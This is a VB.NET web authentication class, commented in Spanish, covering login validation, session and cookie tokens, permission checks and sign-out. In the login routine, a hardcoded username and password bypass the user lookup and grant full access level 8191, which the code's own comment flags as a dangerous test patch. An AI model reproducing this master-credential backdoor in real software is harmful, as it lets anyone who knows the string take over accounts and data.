Imports System.Web.AspNetHostingPermission
Public Class web

    Private Const CONSesion As String = "USR_idUsuario"
    Public Const CONSesionIntentos As String = "USR_intentos"
    Private Const CONtokenTemporal As String = "TKTemporal"
    Private Const CONtokenPermanente As String = "TKPermanente"
    Private Const CONStringtokenCompleto As String = "TKCompleto"
    Private Const CONtokenUsuario As String = "TKUsuario"
    Private Const CONtokenCadena As String = "TKCadena"

    ''' <summary>
    ''' Comprueba si existe ese usr y pwd. Si existe, llena el objeto usuario enviado (viene vacío) y
    ''' crea un token(clave de sesion de usuario) temporal para que siga trabajando
    ''' Si se debe recordar el usuario, se crea un token permanente.
    ''' </summary>
    ''' <param name="u">objeto vacío para llenarse</param>
    ''' <param name="user"></param>
    ''' <param name="pwd"></param>
    ''' <param name="Recordarme">si se recuerda el usuario en esa pc,para que no deba registrarse después</param>
    ''' <remarks></remarks>
    Public Shared Sub validaYRegistraenBrowser(ByRef u As usuario, ByVal user As String, ByVal pwd As String, Optional ByVal recordarme As Boolean = False)
        Dim hasta As Date
        Dim numDiasRecordarme As Long

        'Parche para dar acceso 100%, de prueba. Puede ser peligroso, eliminarlo en ambientes de produccion
        If user = "parangaracutirimicuaro" And pwd = "parangaracutirimicuaro1" Then
            u = New usuario
            u.id = -1
            u.activo = True
            u.nivel = 8191
            u.fechaValidezPWD = Today.AddDays(10)
            EnviaCookieConTokenTemporal(u)
            If funciones.getConfiguracion("pongoUsuarioEnSesion") Then RegistraEnSesion(u)

        Else
            u = New usuario(user, pwd)

            If u.permitirIngreso = True Then
                EnviaCookieConTokenTemporal(u)

                If funciones.getConfiguracion("pongoUsuarioEnSesion") Then RegistraEnSesion(u)
                If funciones.getConfiguracion("guardarIngreso") = True Then GuardarHistorialIngreso(u)

                If funciones.getConfiguracion("numeroIntentos") > 0 Then System.Web.HttpContext.Current.Session(CONSesionIntentos) = 0
                'si quiere que lo recuerde, le envío el cookie fijo con un token que creo ese momento
                If recordarme = True Then
                    numDiasRecordarme = funciones.getConfiguracion("numDiasRecordarUsuario")
                    hasta = Today.AddDays(numDiasRecordarme)
                    enviaCookieConTokenPermanente(u, hasta)
                End If
            Else
                If funciones.getConfiguracion("numeroIntentos") > 0 Then System.Web.HttpContext.Current.Session(CONSesionIntentos) += 1
            End If

        End If


    End Sub


    Public Shared Sub validaYRegistraenBrowserConId(ByRef u As usuario, ByVal idUsuario As Integer)
        u = New usuario(idUsuario)

        If u.permitirIngreso = True Then
            EnviaCookieConTokenTemporal(u)

            If funciones.getConfiguracion("pongoUsuarioEnSesion") Then RegistraEnSesion(u)
            If funciones.getConfiguracion("guardarIngreso") = True Then GuardarHistorialIngreso(u)

            If funciones.getConfiguracion("numeroIntentos") > 0 Then System.Web.HttpContext.Current.Session(CONSesionIntentos) = 0
        Else
            If funciones.getConfiguracion("numeroIntentos") > 0 Then System.Web.HttpContext.Current.Session(CONSesionIntentos) += 1
        End If
    End Sub

    ''' <summary>
    ''' Guarda el acceso del usuario en el historial, dependiendo de la configuración
    ''' </summary>
    ''' <param name="u">Usuario que accedio al sistema, para ser ingresado en historial</param>
    ''' <remarks></remarks>
    Private Shared Sub GuardarHistorialIngreso(ByVal u As usuario)
        Dim historial As historialIngreso

        historial = New historialIngreso(u)
        historial.guardar()

    End Sub

    ''' <summary>
    ''' pone en la sesion una variable con el id del usuario, para solo dar permiso si esta vivo
    ''' </summary>
    ''' <param name="usr"></param>
    ''' <remarks></remarks>
    Private Shared Sub RegistraEnSesion(ByVal usr As usuario)
        Dim context As System.Web.HttpContext = System.Web.HttpContext.Current

        context.Session(CONSesion) = usr.id
    End Sub


    ''' <summary>
    ''' Crea token temporal en el cliente (lo manda como cookie temporal al browser) con la informacion del usuario
    ''' </summary>
    ''' <param name="usr"></param>
    Friend Shared Sub EnviaCookieConTokenTemporal(ByVal usr As usuario)
        'Dim coo2 As System.Web.HttpCookie
        Dim context As System.Web.HttpContext = System.Web.HttpContext.Current
        Dim strcoo As String

        strcoo = usr.getTokenTemporal()

        context.Response.Cookies(CONtokenTemporal)(CONStringtokenCompleto) = strcoo
        context.Response.Cookies(CONtokenTemporal).Expires = Now.AddDays(60)

    End Sub


    ''' <summary>
    ''' Envía al browser del usuario un cookie permanente, con un token para validación posterior
    ''' </summary>
    ''' <param name="usr"></param>
    ''' <param name="hasta"></param>
    ''' <param name="unSoloUso">Si es verdadero, el cookie sirve una sola vez y se lo borra</param>
    ''' <remarks></remarks>
    Private Shared Sub enviaCookieConTokenPermanente(ByVal usr As usuario, ByVal hasta As Date, Optional ByVal unSolouso As Boolean = False)
        Dim token As token
        Dim context As System.Web.HttpContext = System.Web.HttpContext.Current
        Dim Cookie As System.Web.HttpCookie

        'creo el token
        token = New token(usr.id, hasta, unSolouso)

        'creo un cookie y le añado la cadena del token
        Cookie = New System.Web.HttpCookie(CONtokenPermanente)
        Cookie.Values.Add(CONtokenCadena, token.token)

        Cookie.Expires = hasta
        context.Response.AppendCookie(Cookie)

    End Sub


    ''' <summary>
    ''' Devuelve un objeto usuario con los datos del usuario que se encuentre registrado.
    ''' </summary>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public Shared Function TraeUsuarioRegistrado() As usuario
        Dim u As New usuario
        buscaUsuarioRegistrado(u)
        Return u
    End Function

    ''' <summary>
    ''' Devuelve si el usuario regiistrado actualmente tiene alguno de los niveles enviados
    ''' </summary>
    ''' <param name="niveles"></param>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public Shared Function UsuarioActualTieneAlgunPermiso(ByVal ParamArray niveles() As Long) As Boolean
        Dim n As Long
        Dim tiene As Boolean = False
        Dim u As usuario = TraeUsuarioRegistrado()

        If Not u.id = 0 Then 'si no hay usuario no tiene permiso
            For Each n In niveles
                If u.tengoPermiso(n) = True Then
                    tiene = True
                    ' si tiene un nivel, me basta.
                    Exit For
                End If
            Next
        End If


        Return tiene

    End Function

    ''' <summary>
    ''' Devuelve si el usuario regiistrado actualmente tiene cualquier permiso
    ''' </summary>
    Public Shared Function UsuarioActualTieneAlgunPermiso() As Boolean
        Dim tiene As Boolean = False
        Dim u As usuario = TraeUsuarioRegistrado()

        If Not u.id = 0 And u.permitirIngreso Then 'en el caso de que venga como que no existe
            If (Not u.nivel = 0) Then 'si no hay usuario no tiene permiso
                tiene = True
            End If
        End If

        Return tiene

    End Function


    ''' <summary>
    ''' Busca si el usuario tiene permiso, y llena el objeto que se le envía
    ''' Busca dentro de un cookie temporal, cookie permanente, o desde un token en el request (en este orden)
    ''' </summary>
    ''' <param name="usuario">Objeto usuario donde se colocaran la informacion obtenida</param>
    ''' <remarks></remarks>
    Private Shared Sub buscaUsuarioRegistrado(ByRef usuario As usuario)
        Dim context As System.Web.HttpContext = System.Web.HttpContext.Current
        Dim cookie As System.Web.HttpCookie
        Dim TKcompleto As String
        Dim encontrado As Boolean


        If Not context.Request.Cookies(CONtokenTemporal) Is Nothing Then 'Token de usuario

            TKcompleto = context.Request.Cookies(CONtokenTemporal)(CONStringtokenCompleto)
            encontrado = usuario.cargaUsuarioDesdeTokenTemporal(TKcompleto)

            'aca ya esta cargado el usuario,si existe

            ' si debo validarlo en sesion, lo busco aca:
            If funciones.getConfiguracion("pongoUsuarioEnSesion") = True Then
                If context.Session(CONSesion) <> usuario.id Then 'usuario no validad0
                    usuario = New usuario ' mato al usuario creado antes, porque no esta validado en sesion
                End If
            End If
        End If


        ' lo de abajo, necesita base de datos, asi que si la necesito la abro. y luego la cierro
        Dim cerrar As Boolean

        'If htcLib.espacio.conStr = "" Then
        '    htcLib.espacio.inicializa()
        '    cerrar = True
        'End If

        If (Not encontrado) And (Not context.Request.Cookies(CONtokenPermanente) Is Nothing) Then 'Token de usuario permanente
            cookie = context.Request.Cookies(CONtokenPermanente)
            Dim TK As String = cookie.Values(CONtokenCadena)
            encontrado = BuscaUsuarioDesdeTokenFijoYRegistra(usuario, TK)
        End If


        If (Not encontrado) And (Not context.Request(CONtokenCadena) Is Nothing) Then 'Token de usuario                
            Dim TK As String = context.Request(CONtokenCadena)
            BuscaUsuarioDesdeTokenFijoYRegistra(usuario, TK)
        End If

        If cerrar = True Then htcLib.espacio.cerrar()
        
    End Sub

    ''' <summary>
    ''' Carga al usuario enviado por la referencia token y el usuario obtenido de la base, crea un cookie temporal
    ''' </summary>
    ''' <param name="u"></param>
    ''' <param name="tk"></param>
    ''' <remarks></remarks>
    Private Shared Function BuscaUsuarioDesdeTokenFijoYRegistra(ByRef u As usuario, ByVal tk As String) As Boolean
        Dim idu As Long
        Dim retorno As Boolean

        idu = 0 'buscaIdUsuarioDesdeToken(tk)
        'evito buscar en base.

        If Not idu = 0 Then
            u = New usuario(idu)
            EnviaCookieConTokenTemporal(u)
            retorno = True
        Else
            retorno = False
        End If

        Return retorno
    End Function


    ''' <summary>
    ''' Retorna el id de usuario referente al token enviado
    ''' </summary>
    ''' <param name="tk">token enviado</param>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Shared Function buscaIdUsuarioDesdeToken(ByVal tk As String) As Long
        Dim tok As token

        tok = New token(tk)

        If tok.Valido = True Then
            Return tok.idUsuario
        Else
            Return 0
        End If

    End Function


    ''' <summary>
    ''' Elimina los token creados y los cookies temporales
    ''' </summary>
    ''' <remarks></remarks>
    Public Shared Sub signOut()
        Dim context As System.Web.HttpContext = System.Web.HttpContext.Current
        Dim Cookie As System.Web.HttpCookie
        Dim CookieFija As System.Web.HttpCookie

        'mato el token temp
        Cookie = context.Request.Cookies(CONtokenTemporal)
        If Not Cookie Is Nothing Then
            Cookie.Value = ""
            Cookie.Expires = Today.AddDays(-300)
            context.Response.Cookies.Add(Cookie)
        End If

        'mato el token fijo
        CookieFija = context.Request.Cookies(CONtokenPermanente)
        If Not CookieFija Is Nothing Then
            CookieFija.Value = ""
            CookieFija.Expires = Today.AddDays(-300)
            context.Response.Cookies.Add(CookieFija)
        End If

        'mato la sesion
        context.Session.Abandon()

    End Sub



End Class
